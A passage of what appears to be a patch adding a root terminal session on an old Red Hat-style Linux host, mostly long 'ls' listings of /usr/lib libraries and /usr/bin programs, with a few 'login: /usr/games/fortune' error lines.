+libORBitCosNaming.a		libgrove.la			libopcodes.so			libwwwgopher.so.0
+libORBitCosNaming.so		libgrove.so			liborbit-c-backend.a		libwwwgopher.so.0.1.0
+libORBitCosNaming.so.0		libgrove.so.1			libp2c.a			libwwwhtml.a
+libORBitCosNaming.so.0.4.0	libgrove.so.1.0.3		libp2c.so.1			libwwwhtml.la
+libORBitutil.a			libgthread-1.2.so.0		libp2c.so.1.2.0			libwwwhtml.so
+libORBitutil.so			libgthread-1.2.so.0.0.6		libpanel.a			libwwwhtml.so.0
+libORBitutil.so.0		libgthread.a			libpanel.so			libwwwhtml.so.0.1.0
+libORBitutil.so.0.4.0		libgthread.la			libpanel.so.1.9.9e		libwwwhttp.a
+libPropList.a			libgthread.so			libpanel.so.3.0			libwwwhttp.la
+libPropList.la			libgtk-1.2.so.0			libpanel.so.4			libwwwhttp.so
+libPropList.so			libgtk-1.2.so.0.5.1		libpanel.so.4.0			libwwwhttp.so.0
+libPropList.so.0		libgtk.a			libpanel_applet.a		libwwwhttp.so.0.1.0
+libPropList.so.0.2.0		libgtk.la			libpanel_applet.la		libwwwinit.a
+libQwSpriteField.la		libgtk.so			libpanel_applet.so		libwwwinit.la
+libQwSpriteField.so		libgtk.so.1			libpanel_applet.so.0		libwwwinit.so
+libQwSpriteField.so.1		libgtk.so.1.0.6			libpanel_applet.so.0.0.0	libwwwinit.so.0
+libQwSpriteField.so.1.5.0	libgtkxmhtml.a			libpbm.a			libwwwinit.so.0.1.0
+libamu.so			libgtkxmhtml.so			libpbm.so			libwwwmime.a
+libamu.so.2			libgtkxmhtml.so.1		libpbm.so.1			libwwwmime.la
+libamu.so.2.2.0			libgtkxmhtml.so.1.0.1		libpbm.so.1.0.0			libwwwmime.so
+libapm.a			libgtop-features.def		libpcap.a			libwwwmime.so.0
+libartConf.sh			libgtop.a			libpci.a			libwwwmime.so.0.1.0
+libart_lgpl.a			libgtop.la			libpgm.a			libwwwmux.a
+libart_lgpl.so			libgtop.so			libpgm.so			libwwwmux.la
+libart_lgpl.so.2		libgtop.so.1			libpgm.so.1			libwwwmux.so
+libart_lgpl.so.2.1.0		libgtop.so.1.0.5		libpgm.so.1.0.0			libwwwmux.so.0
+libaudiofile.a			libgtopConf.sh			libpgtcl.a			libwwwmux.so.0.1.0
+libaudiofile.so			libgtop_common.a		libpgtcl.so			libwwwnews.a
+libaudiofile.so.0		libgtop_common.la		libpgtcl.so.2			libwwwnews.la
+libaudiofile.so.0.0.0		libgtop_common.so		libpgtcl.so.2.0			libwwwnews.so
+libbfd-2.9.5.0.22.so		libgtop_common.so.1		libpicc.a			libwwwnews.so.0
+libbfd.a			libgtop_common.so.1.0.5		libpics.a			libwwwnews.so.0.1.0
+libbfd.la			libgtop_guile.a			libpisock.a			libwwwstream.a
+libbfd.so			libgtop_guile.la		libpisock.la			libwwwstream.la
+libbsd-compat.a			libgtop_guile.so		libpisock.so			libwwwstream.so
+libbsd.a			libgtop_guile.so.1		libpisock.so.3			libwwwstream.so.0
+libbz2.a			libgtop_guile.so.1.0.5		libpisock.so.3.0.1		libwwwstream.so.0.1.0
+libbz2.la			libgtop_guile_names.a		libpng.a			libwwwtelnet.a
+libbz2.so			libgtop_guile_names.la		libpng.so			libwwwtelnet.la
+libbz2.so.0			libgtop_guile_names.so		libpng.so.2			libwwwtelnet.so
+libbz2.so.0.0.0			libgtop_guile_names.so.1	libpng.so.2.1.0.5		libwwwtelnet.so.0
+libc.a				libgtop_guile_names.so.1.0.5	libpnm.a			libwwwtelnet.so.0.1.0
+libc.so				libgtop_names.a			libpnm.so			libwwwtrans.a
+libc_nonshared.a		libgtop_names.la		libpnm.so.1			libwwwtrans.la
+libc_p.a			libgtop_names.so		libpnm.so.1.0.0			libwwwtrans.so
+libc_stubs.a			libgtop_names.so.1		libpopt.a			libwwwtrans.so.0
+libcapi20.a			libgtop_names.so.1.0.5		libpopt.la			libwwwtrans.so.0.1.0
+libcapi20.so.2			libgtop_suid_common.a		libpopt.so			libwwwutils.a
+libcapi20.so.2.0.0		libgtop_suid_common.la		libpopt.so.0			libwwwutils.la
+libcapplet.a			libgtop_suid_common.so		libpopt.so.0.0.0		libwwwutils.so
+libcapplet.la			libgtop_suid_common.so.1	libposix.a			libwwwutils.so.0
+libcapplet.so			libgtop_suid_common.so.1.0.5	libppm.a			libwwwutils.so.0.1.0
+libcapplet.so.0			libgtop_sysdeps.a		libppm.so			libwwwxml.a
+libcapplet.so.0.0.0		libgtop_sysdeps.la		libppm.so.1			libwwwxml.la
+libcfont.a			libgtop_sysdeps.so		libppm.so.1.0.0			libwwwxml.so
+libcfont.la			libgtop_sysdeps.so.1		libpq++.a			libwwwxml.so.0
+libcfont.so			libgtop_sysdeps.so.1.0.5	libpq++.so			libwwwxml.so.0.1.0
+libcfont.so.0			libguile.a			libpq++.so.3			libwwwzip.a
+libcfont.so.0.0.0		libguile.la			libpq++.so.3.0			libwwwzip.la
+libcom_err.a			libguile.so			libpq.a				libwwwzip.so
+libcom_err.so			libguile.so.4			libpq.so			libwwwzip.so.0
+libconsole.a			libguile.so.4.0.0		libpq.so.2			libwwwzip.so.0.1.0
+libconsole.la			libhistory.a			libpq.so.2.0			libxml.a
+libconsole.so			libhistory.so			libpsqlodbc.a			libxml.la
+libconsole.so.0			libhistory.so.3			libpsqlodbc.so			libxml.so
+libconsole.so.0.0.0		libhistory.so.3.0		libpsqlodbc.so.0		libxml.so.0
+libcrack.so			libiberty.a			libpsqlodbc.so.0.25		libxml.so.0.0.0
+libcrack.so.2			libieee.a			libpthread.a			libxml.so.1
+libcrack.so.2.7			libimlib-bmp.a			libpthread.so			libxml.so.1.8.6
+libcrypt.a			libimlib-bmp.la			libpthread_p.a			libxmlparse.a
+libcrypt.so			libimlib-bmp.so			libpuke.a			libxmlparse.la
+libcrypt_p.a			libimlib-gif.a			libpuke.la			libxmlparse.so
+libctgeneric.a			libimlib-gif.la			libpuke.so			libxmlparse.so.0
+libctgeneric.la			libimlib-gif.so			libpuke.so.0			libxmlparse.so.0.1.0
+libctgeneric.so			libimlib-jpeg.a			libpuke.so.0.0.1		libxmltok.a
+libctgeneric.so.0		libimlib-jpeg.la		libpxeParser.so			libxmltok.la
+libctgeneric.so.0.0.0		libimlib-jpeg.so		libpxeParser.so.1.0		libxmltok.so
+libctutils.a			libimlib-png.a			libpxeTester.so			libxmltok.so.0
+libctutils.la			libimlib-png.la			libpxeTester.so.1.0		libxmltok.so.0.1.0
+libctutils.so			libimlib-png.so			libpxelib.so			libxmms.a
+libctutils.so.0			libimlib-ppm.a			libpxelib.so.1.0		libxmms.so
+libctutils.so.0.0.0		libimlib-ppm.la			libreadline.a			libxmms.so.1
+libcurses.so			libimlib-ppm.so			libreadline.so			libxmms.so.1.0.0
+libcustoms.a			libimlib-ps.a			libreadline.so.3		libz.a
+libdb.a				libimlib-ps.la			libreadline.so.3.0		libz.so
+libdb.so			libimlib-ps.so			librep.a			libz.so.1
+libdb1.a			libimlib-tiff.a			librep.so			libz.so.1.1.3
+libdb1.so			libimlib-tiff.la		librep.so.7			libzvt.a
+libdb1_p.a			libimlib-tiff.so		librep.so.7.0.0			libzvt.so
+libdb_p.a			libimlib-xpm.a			libresolv.a			libzvt.so.2
+libdeflt.a			libimlib-xpm.la			libresolv.so			libzvt.so.2.2.6
+libdl.a				libimlib-xpm.so			libresolv_p.a			linuxconf
+libdl.so			libinn.a			librle.a			linuxconf-devel
+libdl_p.a			libisapnp.a			librle.so			lout
+libe2p.a			libitcl.so			librle.so.1			mail.help
+libe2p.so			libitcl3.0.so			librle.so.1.0.0			mail.tildehelp
+libecpg.a			libitk.so			librpcsvc.a			man
+libecpg.so			libitk3.0.so			librpcsvc_p.a			mc
+libecpg.so.3			libjpeg.a			librpm.a			metamail
+libecpg.so.3.0.0		libjpeg.la			librpm.la			mgetty+sendfax
+libefence.a			libjpeg.so			librpm.so			mh
+libelf.a			libjpeg.so.6			librpm.so.0			mime.types
+liberror.txt			libjpeg.so.6.0.1		librpm.so.0.0.0			more.help
+libesd.a			libjpeg.so.62			librpmbuild.a			mpage
+libesd.la			libjpeg.so.62.0.0		librpmbuild.la			netscape
+libesd.so			libjs.la			librpmbuild.so			nmh
+libesd.so.0			libjs.so			librpmbuild.so.0		nslookup.help
+libesd.so.0.2.17		libjs.so.0			librpmbuild.so.0.0.0		nss_ldap.so
+libesddsp.a			libjs.so.0.2.0			librt.a				obGnomeConf.sh
+libesddsp.la			libjscript.la			librt.so			p2c
+libesddsp.so			libjscript.so			librt_p.a			perl5
+libesddsp.so.0			libjscript.so.2			libscg.a			pgsql
+libesddsp.so.0.2.17		libjscript.so.2.0.0		libschily.a			pilot-link
+libexpect5.28.a			libkab.la			libslang.a			pmake
+libexpect5.28.so		libkab.so			libslang.so			python1.5
+libext2fs.a			libkab.so.2			libslang.so.1			qt-1.45
+libext2fs.so			libkab.so.2.0.0			libslang.so.1.2.2		qt-2.1.0
+libfbm.a			libkdecore.la			libsnmp.a			rhs
+libfbm.so			libkdecore.so			libsnmp.so			romio
+libfbm.so.1			libkdecore.so.2			libsnmp.so.0			rpm
+libfbm.so.1.0.0			libkdecore.so.2.0.0		libsnmp.so.0.4.1.1		rpmdb
+libfish_applet.a		libkdeui.la			libsp.a				sendmail
+libfish_applet.la		libkdeui.so			libsp.la			sendmail-cf
+libfish_applet.so		libkdeui.so.2			libsp.so			sendmail.hf
+libfish_applet.so.0		libkdeui.so.2.0.0		libsp.so.1			sgml
+libfish_applet.so.0.0.0		libkfile.la			libsp.so.1.0.3			sgml-tools
+libfl.a				libkfile.so			libspgrove.a			slrn
+libform.a			libkfile.so.2			libspgrove.la			squid
+libform.so			libkfile.so.2.0.0		libspgrove.so			tcl8.0
+libform.so.1.9.9e		libkfm.la			libspgrove.so.1			tclConfig.sh
+libform.so.3.0			libkfm.so			libspgrove.so.1.0.3		tclX8.0.4
+libform.so.4			libkfm.so.2			libss.a				tclxConfig.sh
+libform.so.4.0			libkfm.so.2.0.0			libss.so			tix4.1
+libg++.so.2.7.2			libkhtmlw.la			libst.a				tk8.0
+libg++.so.2.7.2.8		libkhtmlw.so			libstdc++-2-libc6.1-1-2.9.0.a	tkConfig.sh
+libg.a				libkhtmlw.so.2			libstdc++-2-libc6.1-1-2.9.0.so	tkX8.0.4
+libgck.a			libkhtmlw.so.2.0.0		libstdc++-libc6.1-1.a.2		tksysv
+libgck.la			libkimgio.la			libstdc++-libc6.1-1.so.2	tkxConfig.sh
+libgck.so			libkimgio.so			libstdc++.so.2.7.2		trn
+libgck.so.1			libkimgio.so.2			libstdc++.so.2.7.2.8		umb-scheme
+libgck.so.1.0.0			libkimgio.so.2.0.0		libstdc++.so.2.8		uucp
+libgd.so			libkpathsea.a			libstdc++.so.2.8.0		xbill
+libgd.so.1			libkplunger.a			libstdc++.so.2.9		xlispstat
+libgd.so.1.2			libkspell.la			libstdc++.so.2.9.dummy		xmlConf.sh
+libgdbm.a			libkspell.so			libstorage.a			xmms
+libgdbm.la			libkspell.so.2			libstyle.a			yp
+login: /usr/games/fortune: No such file or directory
+login: /usr/games/hunt: No such file or directory
+
+[root@ariel lib]# cd /usr/bin
+login: /usr/games/fortune: No such file or directory
+login: /usr/games/hunt: No such file or directory
+
+[root@ariel bin]# ls
+GnomeScott			gnome-run			mcserv				rasttopnm
+Mail				gnome-session			md5sum				raw
+MakeTeXPK			gnome-smproxy			mdel				raw2gif
+Pnews				gnome-splash			mdeltree			rawtopgm
+Rnmail				gnome-stones			mdir				rawtoppm
+X11				gnome-terminal			mdu				rb
+[				gnome-wm			memos				rclock
+a2p				gnome_segv			memprof				rcp
+ac				gnomecal			merge				rcs
+accel				gnomecard			mesg				rcs-checkin
+access				gnomecc				messages			rcs2log
+aclocal				gnomepager_applet		metamail			rcsclean
+actived				gnomexmms			metasend			rcsdiff
+actmerge			gnomine				mev				rcsmerge
+actsync				gnorpm				mf				rcvAppleSingle
+actsyncd			gnorpm-auth			mformat				rdate
+addftinfo			gnotravex			mft				rdist
+addmodetest			gnp				mfw				rdistd
+addr				gnroff				mgrtopbm			rdjpgcom
+addr2line			gnuan				mh				read-expenses
+addresses			gnuchess			mhbuild				read-ical
+addtosmbpass			gnuchessc			mhlist				read-todos
+afm2tfm				gnuchessn			mhmail				readcd
+afmtodit			gnuchessr			mhn				readelf
+alarmd				gnuchessx			mhparam				readlink
+ali				gnumeric			mhpath				readmsg
+allcm				gnuplot				mhshow				reboot
+allec				gnuplot_x11			mhstore				rec
+allneeded			goad-browser			mikmod				recon
+amstex				gouldtoppm			mime-type-capplet		refer
+anno				gpasswd				mimencode			refile
+another_clock_applet		gperf				minfo				reginfo
+answer				gpg				mini_commander_applet		reminders
+anytopnm			gpgp				minicom				remsync
+apm				gpic				mixer_applet			rename
+apmsleep			gpm-root			mjoytest			renice
+appletviewer			gprof				mk_cmds				rep
+apropos				gqview				mk_modmap			rep-config
+ar				grefer				mkafmmap			rep-remote
+archive				grephistory			mkfifo				repdoc
+ark				grodvi				mkfontdesc			repl
+as				groff				mkindex				reset
+as86				grog				mkinodedb			resetall
+as86_encap			grohtml				mkisofs				resizecons
+ascii-xfr			grolj4				mkmanifest			restorefont
+asciitopgm			grops				mkocp				restorepalette
+asclock_applet			grotty				mkofm				restoretextmode
+at				groups				mkpasswd			rev
+atktopbm			grun				mkpreview			rexec
+atq				gs				mkservdb			rexport
+atrm				gsbj				mksmbpasswd.sh			rftp
+audiocompose			gsdj				mktexlsr			rgb2gif
+audiofile-config		gsdj500				mktexmf				rgb2ycbcr
+audiosend			gsearchtool			mktexpk				rgb3toppm
+aumix				gsftopk				mktextfm			rgrep
+auth				gslj				mlabel				rhmask
+autoconf			gslp				mmd				richtext
+autoexpect			gsnd				mmencode			richtoatk
+autoheader			gsoelim				mmount				ripquery
+automake			gstripchart			mmove				rjoe
+autopasswd			gtali				mod-active			rle2gif
+autopvf				gtbl				mode3				rlog
+autoreconf			gtcd				modemlights_applet		rlogin
+autorun				gtk-config			modemtool			rlogin-cwd
+autoscan			gtk-shell			modulator			rmail
+autoupdate			gtop				money2qif			rman
+autovbox			gtroff				mouse-properties-capplet	rmdfile
+awk				gtt				mousetest			rmdtopvf
+b2m				gturing				mpage				rmf
+background-properties-capplet	guile				mpartition			rmic
+balky				guile-config			mpg123				rmiregistry
+bamstex				guile-snarf			mpiCC				rmm
+bankspeed			guname				mpicc				rnews
+bash2bug			gunzip				mpif77				rnews.libexec
+bashbug				gusload				mpimsg				rp3
+basictopvf			gw				mpirun				rp3-config
+batch				gxedit				mpitask				rpcgen
+batcher				gzexe				mpost				rpm2cpio
+battery_applet			gzip				mpto				rpm2html
+bc				h2ph				mrd				rpmfind
+bcc				h2xs				mread				rpmlint
+bdftops				halt				mren				rsh
+bell-properties-capplet		hboot				msgchk				rsync
+bfctl				hcc				msgcmp				rtf2rtf
+bfstate				hcp				msgcomm				rtin
+bg_test				head				msgfmt				rubibtex
+bibtex				helpme				msghack				rumakeindex
+biff				helptool			msgmerge			run-parts
+binhex				hexbin				msgunfmt			runscript
+bioradtopgm			hexdump				msh				rup
+bison				hf77				mshowfat			ruptime
+bltwish				hinotes				mtools				rusers
+bltwish2.4			hipstopgm			mtoolstest			rwall
+bmptoppm			hltest				mtrace				rwho
+bplain				host				mtvtoppm			rx
+brushtopbm			hostid				mtype				rxvt
+buffchan			hoststat			multiload_applet		rz
+bug-buddy			hpcdtoppm			munchlist			s2p
+buildhash			hpftodit			mutt				same-gnome
+bunzip2				htdigest			muttbug				save-session
+burst				htpasswd			mxtar				savetextmode
+byacc				i386-glibc20-linux-c++		mzip				saveunimap
+bzcat				i386-glibc20-linux-g++		name-client			sawmill
+bzip2				i386-glibc20-linux-g77		namei				sawmill-capplet
+bzip2recover			i386-glibc20-linux-gcc		native2ascii			sawmill-client
+bzless				i386-redhat-linux-gcc		nc				sawmill-themer
+c++				iagno				ncftp				sawmill-ui
+c++decl				iambicexample			ncftpbatch			sb
+c++filt				ical				ncftpbookmarks			scan
+c2lout				ical-2.2			ncftpget			scanlogs
+c2ph				icombine			ncftpls				scanspool
+cal				icon2gif			ncftpput			screen
+calibrate			icontopbm			ncopy				screendump
+callbootd			iconv				ncpmount			screensaver-properties-capplet
+capifax				id				ncpumount			script
+capifaxrcvd			ident				nenscript			scrolltest
+capiinfo			idetool				neqn				sdiff
+captoinfo			idle				netcfg				send
+catchsegv			ietf2datebook			netscape			send-ihave
+cc				ifnames				netscape-communicator		send-nntp
+ccexample			ijoin				netscape-navigator		send-uucp
+cd-capplet			ilbmtoppm			new-object			sendbatch
+cdda2wav			imgtoppm			newalias			sendfiles
+cddaslave			imlib-config			newaliases			sendxbatches
+cddbslave			imlib_config			newer				seq
+cddbsubmit			inc				newgrp				serialver
+cdecl				indent				newkrn				session-properties
+cdp				indxbib				newmail				session-properties-capplet
+cdparanoia			inews				news.daily			setfdprm
+cdplay				info				news2mail			setfont
+cdplayer_applet			infocmp				newsetup			setfx
+cdrecord			infotocap			newsgroups			setkeycodes
+chage				inimf				newslock			setleds
+charpick_applet			inimpost			newsrequeue			setmetamode
+charset				iniomega			next				setsid
+chattr				initdb				nfrm				setterm
+checkalias			initex				nl				setvesablank
+chfn				initlocation			nm				sf2text
+chsh				inncheck			nm86				sfconvert
+chvt				innconfval			nmblookup			sfinfo
+ci				innd				nnrpd				sfxtest
+cjpeg				inndf				nntpget				sg
+cksum				inndstart			nntplist			sgitopnm
+clear				innfeed				nntpsend			sgml2html
+cleardbdir			innfeed-convcfg			nohup				sgml2info
+clockmail_applet		innmail				nprint				sgml2latex
+cmail				innreport			nroff				sgml2lyx
+cmp				innstat				nsend				sgml2rtf
+cmuwmtopbm			innwatch			nsgmls				sgml2txt
+cnfsstat			innxbatch			nslookup			sgml2xml
+co				innxmit				nsupdate			sgmlcheck
+codepage			install				nwauth				sgmlnorm
+col				install-catalog			nwbocreate			sgmlpre
+colcrt				install-datebook		nwbols				sgmlsasp
+colrm				install-hinote			nwboprops			sgmltools.v1
+column				install-jar			nwborm				shar
+comm				install-memo			nwbpadd				shlock
+comp				install-todos			nwbpcreate			show
+compile_et			install-user			nwbprm				showaudio
+compress			ipcclean			nwbpset				showcfont
+consolechars			ipcrm				nwbpvalues			showexternal
+consolehelper			ipcs				nwdir				showkey
+control				ipx_cmd				nwdpvalues			shownonascii
+control-panel			ipx_route			nwfsctrl			showpartial
+controlbatch			ipxdump				nwfsinfo			showpicture
+controlchan			ipxparse			nwfstime			shred
+convdate			irc				nwgrant				shrinkfile
+convert_smbpasswd		irc-4.4M			nwpasswd			shutdown
+cproto				ircbug				nwpurge				simpleftp
+cpumemusage_applet		ircflush			nwrevoke			sirtopnm
+createdb			ircio				nwrights			size
+createlang			irdadump			nwsfind				size86
+createuser			irkbd				nwtrustee			skill
+crontab				irpsion5			nwtrustee2			sldtoppm
+crosspost			isdn-config			nwuserlist			sliceprint
+cryptdir			isdnconf			nwvolinfo			slist
+csplit				isdnrate			obgnome-config			slocate
+ct				isdnrep				objcopy				slrn
+ctags				isdnview			objdump				slrnpull
+ctali				isodump				objdump86			sm
+ctlinnd				isoinfo				od				smbadduser
+cu				isovfy				odvicopy			smbclient
+cut				ispell				odvips				smbmnt
+cvs				itclsh3.0			odvitype			smbmount
+cvsbug				itkwish3.0			ofm2opl				smbpasswd
+cvtbatch			jade				oldps				smbprint
+cytune				jadetex				omega				smbstatus
+db2dvi				jar				on_ac_power			smbtar
+db2html				java				open				smbumount
+db2pdf				javac				opl2ofm				sndAppleSingle
+db2ps				javadoc				orbit-config			snice
+db2rtf				javakey				orbit-event-server		snmpbulkget
+db_archive			javap				orbit-idl			snmpbulkwalk
+db_checkpoint			jbc_applet			orbit-ird			snmpdelta
+db_deadlock			jdb				orbit-name-server		snmpget
+db_dump				jed				ospf_monitor			snmpgetnext
+db_dump185			jikes				otangle				snmpnetstat
+db_load				jmacs				otp2ocp				snmpset
+db_printlog			joe				outocp				snmpstatus
+db_recover			join				over				snmptable
+db_stat				joytest				overchan			snmptest
+dbmmanage			jpegtran			ovf2ovp				snmptranslate
+dc				jpico				ovp2ovf				snmptrap
+ddate				jsattach			oxdvi				snmpusm
+deallocvt			jscal				oxdvi.bin			snmpwalk
+debugsh				jstar				p2c				socklist
+decryptdir			jstest				packf				soelim
+deskguide_applet		kab				pal2rgb				sol
+destroydb			kabalone			panel				sortm
+destroylang			kabapi_test			parsecontrol			sound-properties
+destroyuser			kaffe				passmass			sox
+detect_ppa			kaffeh				passwd				soxplay
+devdump				kappfinder			paste				spam
+dialog				kappfinder_restart		patch				spctoppm
+diff				karchie				patch-metamail			speedtest
+diff3				karm				patgen				spell
+diffpp				kattraction.kss			pathchk				spent
+diffstat			kaudioserver			pawd				sperl5.00503
+dig				kbanner.kss			pbm2g3				spin
+dir				kbat.kss			pbm2ppa				splac
+dircolors			kbd_mode			pbmclean			splain
+dirname				kbdrate				pbmlife				splash
+diskusage_applet		kbgndwm				pbmmake				split
+dislocate			kbiff				pbmmask				splitmail
+dist				kblackbox			pbmpscale			spottopgm
+djpeg				kblankscrn.kss			pbmreduce			sprof
+dlpsh				kblob.kss			pbmtext				sputoppm
+dmp				kbouboule.kss			pbmto10x			sq
+dns-helper			kbsod.kss			pbmto4425			startinnfeed
+dnsquery			kcalc				pbmtoascii			startkde
+doom				kcheckpass			pbmtoatk			stat
+dox				kcmbell				pbmtobbnbg			state
+drivemount_applet		kcmdisplay			pbmtocmuwm			states
+dsirc				kcmdpms				pbmtoepsi			statserial
+du				kcmikbd				pbmtoepson			strace
+dumpkeys			kcminfo				pbmtog3				strings
+dumpreg				kcminput			pbmtogem			strip
+dvi2fax				kcmkeys				pbmtogo				suidperl
+dvicopy				kcmkfm				pbmtoicon			sum
+dvihp				kcmkonsole			pbmtolj				sun-audio-file
+dvilj				kcmkpanel			pbmtoln03			sun-message.csh
+dvilj2p				kcmktalkd			pbmtolps			sun-to-mime
+dvilj4				kcmkwm				pbmtomacp			sun2mime
+dvilj4l				kcmlocale			pbmtomgr			svgakeymap
+dvilj6				kcmsamba			pbmtopgm			svidtune
+dvipdf				kcmsyssound			pbmtopi3			sweep
+dvips				kcontrol			pbmtopk				switchdesk
+dvired				kdat				pbmtoplot			switchdesk-gnome
+dvitomp				kde				pbmtoptx			switchdesk-helper
+dvitype				kdecode				pbmtox10bm			switchdesk-kde
+e-conf				kdehelp				pbmtoxbm			switchto
+e2pall				kdm				pbmtoybm			sx
+ecpg				kdmconfig			pbmtozinc			symlinks
+ee				kdmdesktop			pbmtpg				sync-plan
+eesh				kdoc				pbmupc				sz
+efax				kdoc2				pcxtoppm			tac
+efix				kdvi				pdf2dsc				tack
+egcs				kedit				pdf2ps				tail
+einitex				kernelcfg			pdfeinitex			tailf
+eject				keyboard-properties		pdfelatex			talk
+elatex				keytab-lilo			pdfetex				tally.control
+elksemu				keytest				pdfevirtex			tangle
+elm				kfax				pdfimages			tasklist_applet
+elmalias			kfdformat			pdfinfo				tbl
+emacs				kfind				pdfinitex			tcd
+emacs-20.5			kfinger				pdfjadetex			tcl
+emacs-nox			kflame.kss			pdflatex			tclhelp
+emacsclient			kfloppy				pdftex				tclsh
+encode_keychange		kfm				pdftopbm			tclsh8.0
+enlightenment			kfmbrowser			pdftops				tee
+enscript			kfmclient			pdftotext			telnet
+env				kfmexec				pdfvirtex			test
+epp				kfmsu				pdksh				test_ppa
+epstopdf			kfmsu2				perl				testaccel
+eqn				kfmwarn				perl5.00503			testgl
+esd				kfontmanager			perlbug				testlinear
+esd-config			kforest.kss			perlcc				testparm
+esdcat				kfract				perldoc				testprns
+esdctl				kghostview			pfb2pfa				tex
+esddsp				khexdit				pfbtops				texconfig
+esdfilt				khop.kss			pftp				texdoc
+esdloop				kibitz				pg_dump				texexec
+esdmon				kiconedit			pg_dumpall			texhash
+esdplay				kikbd				pg_encoding			texi2dvi
+esdrec				killall				pg_id				texi2html
+esdsample			kioslave			pg_passwd			texi2pdf
+etags				kjc				pg_upgrade			texindex
+etex				kjots				pg_version			texlinks
+eventtest			klaser.kss			pgaccess			texshow
+evirtex				klines.kss			pgmbentley			text2gif
+ex				klipper				pgmcrater			text2sf
+exmh				klissie.kss			pgmedge				textmode
+exmh-async			kljettool			pgmenhance			texutil
+exmh-bg				klock				pgmhist				tfmtodit
+expand				klpq				pgmkernel			tftopl
+expect				kmahjongg			pgmnoise			tftp
+expectk				kmail				pgmnorm				tgatoppm
+expire				kmatrix.kss			pgmoil				tgz
+expireindex			kmedia				pgmramp				theme-selector-capplet
+expireover			kmenuedit			pgmtexture			thumbnail
+expirerm			kmid				pgmtofs				thumbpdf
+export				kmidi				pgmtolispm			tic
+expr				kmines				pgmtopbm			tie
+ext2ed				kmix				pgmtoppm			tiff2bw
+extace				kmkdosfs			pgpewrap			tiff2ps
+extcompose			kmke2fs				pgpring				tiff2rgba
+f77				kmoon				pgpverify			tiffcmp
+factor				kmorph3d.kss			pgtclsh				tiffcp
+faillog				knotes				pgtksh				tiffdither
+fastmail			knu				pi-csd				tiffdump
+fastrm				kodo				pi-getram			tiffinfo
+fax				konquest			pi-getrom			tiffmedian
+fax2ps				konsole				pi-nredir			tiffsplit
+fax2tiff			konsole_grantpty		pi-port				tifftopnm
+faxq				korganizer			pi1toppm			time
+faxrm				korn				pi3topbm			timed-read
+faxrunq				kotalkd				pic				timed-run
+faxspool			kpackage			pick				timetool
+fctl				kpackage_dpkg_ins		pico				tin
+fdformat			kpackage_dpkg_rm		picttoppm			tixindex
+fetchmail			kpackage_slack_l		pilot				tixwish4.1.8.0
+fetchmailconf			kpager				pilot-addresses			tkill
+fgconsole			kpaint				pilot-clip			tknewsbiff
+fifteen_applet			kpanel				pilot-debug			tkpasswd
+file				kpat				pilot-dedupe			tload
+file_by_inode			kpilot				pilot-file			toe
+filechan			kpilotDaemon			pilot-mail			tomac
+filter				kpipes.kss			pilot-schlep			top
+find				kplayaudio			pilot-undelete			tping
+find2perl			kpm				pilot-xfer			tput
+findaffix			kpmdocked			pilotListener			tr
+findsmb				kpoker				pine				tree
+finger				kpolygon.kss			pinky				trn
+fitstopnm			kppp				pjtoppm				trn-artchk
+fix_bs_and_del			kpppload			pk2bm				troff
+flex				kppplogview			pktogf				tryaffix
+flex++				kpsepath			pktopbm				tset
+flist				kpsestat			pktype				tsort
+flists				kpsetool			pl2pm				ttf2afm
+fmt				kpsewhich			plain-gmc			ttmkfdir
+fmtutil				kpsexpand			play				tty
+fold				kpyro.kss			playmidi			tzselect
+folder				krb5				pltotf				ud
+folders				krdb				pmake				ui-properties
+font2c				kreversi			pngtopnm			ul
+fontexport			krn				pnm2ppa				umb-scheme
+fontimport			krock.kss			pnmalias			unarj
+fontinst			krootwm				pnmarith			unbuffer
+forktest			ksame				pnmcat				uncompress
+formail				kscd				pnmcomp				unexpand
+forw				kscdmagic			pnmconvol			unicode_start
+free				kscience.kss			pnmcrop				unicode_stop
+freecell			ksh				pnmcut				uniq
+frm				kshisen				pnmdepth			units
+frommac				ksirc				pnmenlarge			unpack
+fstate				kslidescreen.kss		pnmfile				unprotoize
+fstopgm				kslip.kss			pnmflip				unshar
+ftdump				ksmiletris			pnmgamma			unsq
+fterror				ksnake				pnmhisteq			unzip
+ftlint				ksnapshot			pnmhistmap			unzipsfx
+ftmetric			ksokoban			pnmindex			up2date
+ftp				kspace.kss			pnminvert			updatedb
+ftp-ls.sh			kstart				pnmmargin			uptime
+ftp-put.sh			ksticker			pnmnlfilt			url-properties
+ftp-rfc				kswarm.kss			pnmnoraw			url_handler.sh
+ftp.expect			ksymoops			pnmpad				urlview
+ftp.sh				ksysv				pnmpaste			userinfo
+ftpcount			ktalkd				pnmrotate			usermount
+ftpwho				ktalkdlg			pnmscale			usernet
+ftsbit				kthememgr			pnmshear			userpasswd
+ftstring			ktop				pnmsmooth			users
+ftstrpnm			kuser				pnmtile				utmpdump
+ftstrtto			kvg				pnmtoddif			uucp
+fttimer				kview				pnmtofits			uudecode
+ftview				kvt				pnmtopng			uuencode
+ftzoom				kwm				pnmtops				uuidgen
+fun				kwmcom				pnmtorast			uulog
+funzip				kwmsound			pnmtosgi			uuname
+fwhois				kworldwatch			pnmtosir			uupick
+g++				kwrite				pnmtotiff			uustat
+g32pbm				lambda				pnmtoxwd			uuto
+g3cat				lamboot				pod2html			uux
+g3topbm				lamclean			pod2latex			uz
+g77				lamd				pod2man				vacuumdb
+game				lamexec				pod2text			vbox
+gasp				lamgrow				pooltype			vboxbeep
+gataxx				lamshrink			postgres			vboxcnvt
+gawk				lamtrace			postgresql-dump			vboxctrl
+gcalc				last				postmaster			vboxmail
+gcc				lastb				postprint			vboxmode
+gcolorsel			lastcomm			poweroff			vboxplay
+gconfigger			lastlog				ppm2tiff			vboxtoau
+gcov				latex				ppm3d				vcstime
+gctags				ld				ppmbrighten			vdir
+gdb				ld86				ppmchange			vftovp
+gdc				ldapadd				ppmdim				vgatest
+gdialog				ldapdelete			ppmdist				viamail
+gdiskfree			ldapmodify			ppmdither			viewfax
+gdm				ldapmodrdn			ppmflash			vim
+gdmchooser			ldappasswd			ppmforge			virmf
+gdmconfig			ldapsearch			ppmhist				virmpost
+gdmlogin			ldd				ppmmake				viromega
+gedit				lddlibc4			ppmmix				virtex
+gemtopbm			less				ppmnorm				vlock
+gen_util_applet			lessecho			ppmntsc				vm
+gencat				lesskey				ppmpat				vmake
+gendiff				lessn				ppmquant			vmstat
+genromfs			lesspipe.sh			ppmquantall			voctopvf
+geqn				lex				ppmqvga				vptovf
+getconf				libIDL-config			ppmrelief			vt-is-UTF8
+getent				libart-config			ppmshift			vumeter
+getfilename			libglade-config			ppmspread			w3c
+getkeycodes			libglade-xgettext		ppmtoacad			wall
